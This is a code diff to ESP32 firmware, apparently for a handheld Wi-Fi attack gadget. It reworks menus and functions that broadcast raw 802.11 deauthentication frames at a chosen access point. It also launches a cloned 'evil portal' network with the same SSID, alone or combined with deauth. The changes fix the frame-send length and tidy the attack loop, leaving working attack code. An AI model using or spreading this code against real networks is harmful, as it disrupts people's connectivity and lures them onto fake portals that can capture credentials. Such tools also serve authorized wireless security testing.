@@ -10,6 +10,7 @@
 #include "display.h"
 #include "mykeyboard.h"
 #include "evil_portal.h"
+#include "wifi_common.h"
 
 
 /**
@@ -45,9 +46,10 @@ wifi_ap_record_t ap_record;
 ** @brief: Broadcasts deauth frames
 ***************************************************************************************/
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
-    Serial.begin(115200);
-    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, sizeof(&frame_buffer), false));
-    Serial.println(" -> Sent deauth frame");
+    //Serial.begin(115200);
+    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
+    //Serial.println(" -> Sent deauth frame");
+    delay(5);
 }
 
 
@@ -73,8 +75,9 @@ void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan
 ** function: wifi_atk_info
 ** @brief: Open Wifi information screen
 ***************************************************************************************/
-void wifi_atk_info(uint8_t* bssid, String tssid,String mac, uint8_t channel) {
+void wifi_atk_info(String tssid,String mac, uint8_t channel) {
   //desenhar a tela
+  drawMainMenu();
   menu_op.deleteSprite();
   menu_op.createSprite(WIDTH-20, HEIGHT-35);
   menu_op.fillRect(0,0, menu_op.width(),menu_op.height(), BGCOLOR);
@@ -90,7 +93,7 @@ void wifi_atk_info(uint8_t* bssid, String tssid,String mac, uint8_t channel) {
   delay(300);
   while(!checkSelPress()) {
     while(!checkSelPress()) { yield(); } // timerless debounce
-    target_atk_menu(bssid, tssid, mac, channel);
+    target_atk_menu(tssid, mac, channel);
     returnToMenu=true;
     break;
   }
@@ -109,8 +112,12 @@ void wifi_atk_menu() {
     nets=WiFi.scanNetworks();
     options = {  };
     for(int i=0; i<nets; i++){
-      options.push_back({WiFi.SSID(i).c_str(), [=]() { target_atk_menu(WiFi.BSSID(i), WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i), static_cast<uint8_t>(WiFi.encryptionType(i))); }});
+      //criar o frame
+      memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
+      uint8_t chan = static_cast<uint8_t>(WiFi.channel(i));
+      options.push_back({WiFi.SSID(i).c_str(), [=]() { target_atk_menu(WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i), chan); }});
     }
+
     options.push_back({"Main Menu", [=]()     { backToMenu(); }});
 
     delay(200);
@@ -121,11 +128,12 @@ void wifi_atk_menu() {
 ** function: target_atk_menu
 ** @brief: Open menu to choose which AP Attack
 ***************************************************************************************/
-void target_atk_menu(uint8_t* bssid, String tssid,String mac, uint8_t channel) {
+void target_atk_menu(String tssid,String mac, uint8_t channel) {
     options = { 
-      {"Deauth", [=]()        { target_atk(bssid, tssid, mac, channel); }},
-      {"Clone Portal", [=]()  { startEvilPortal(tssid, bssid, channel,false); }},
-      {"Deauth+Clone", [=]()  { startEvilPortal(tssid, bssid, channel,true); }},
+      {"Information", [=]()   { wifi_atk_info(tssid, mac, channel); }},
+      {"Deauth", [=]()        { target_atk(tssid, mac, channel); }},
+      {"Clone Portal", [=]()  { startEvilPortal(tssid, channel,false); }},
+      {"Deauth+Clone", [=]()  { startEvilPortal(tssid, channel,true); }},
       {"Main Menu", [=]()     { backToMenu(); }}, 
     };
 
@@ -139,13 +147,16 @@ void target_atk_menu(uint8_t* bssid, String tssid,String mac, uint8_t channel) {
 ** function: target_atk
 ** @brief: Deploy Target deauth
 ***************************************************************************************/
-void target_atk(uint8_t* bssid, String tssid,String mac, uint8_t channel) {
+void target_atk(String tssid,String mac, uint8_t channel) {
   Serial.begin(115200);
-  //criar o frame
-  memcpy(ap_record.bssid, bssid, 6);
+
   WiFi.mode(WIFI_AP);
-  WiFi.softAP(tssid, emptyString, channel, 1, 4, false);
+  if(!WiFi.softAP(tssid, emptyString, channel, 1, 4, false)) {
+    displayError("Falha 1");
+    while(!checkSelPress()) { yield(); }
+  }
   wifiConnected=true;
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
   wsl_bypasser_send_raw_frame(&ap_record,channel);
 
   //loop com o ataque mostrando o numero de frames por segundo
@@ -155,6 +166,12 @@ void target_atk(uint8_t* bssid, String tssid,String mac, uint8_t channel) {
   bool redraw = true;
   delay(200);
   checkSelPress();
+
+
+
+
+
+  drawMainMenu();
   while(1) {
     if(redraw) {
       //desenhar a tela
@@ -185,7 +202,7 @@ void target_atk(uint8_t* bssid, String tssid,String mac, uint8_t channel) {
     //Pause attack
     if(checkSelPress()) {
       displayRedStripe("Deauth Paused",TFT_WHITE,FGCOLOR);
-      while(checkSelPress()) { yield(); } // timeless debounce
+      while(checkSelPress()) { delay(50); } // timeless debounce
       // wait to restart or kick out of the function
       while(!checkSelPress()) { 
         #ifndef CARDPUTER
@@ -194,8 +211,9 @@ void target_atk(uint8_t* bssid, String tssid,String mac, uint8_t channel) {
           Keyboard.update();
           if(Keyboard.isKeyPressed('`')) break; // Apertar o ESC do cardputer
         #endif
-       }
-      while(checkSelPress()) { yield(); } // timeless debounce
+      }
+      while(checkSelPress()) { delay(50); } // timeless debounce
+      redraw=true;
     }    
     // Checks para sair do while
   #ifndef CARDPUTER
@@ -205,6 +223,7 @@ void target_atk(uint8_t* bssid, String tssid,String mac, uint8_t channel) {
     if(Keyboard.isKeyPressed('`')) break; // Apertar o ESC do cardputer
   #endif
   }
+  wifiDisconnect();
   returnToMenu=true;
 }
 
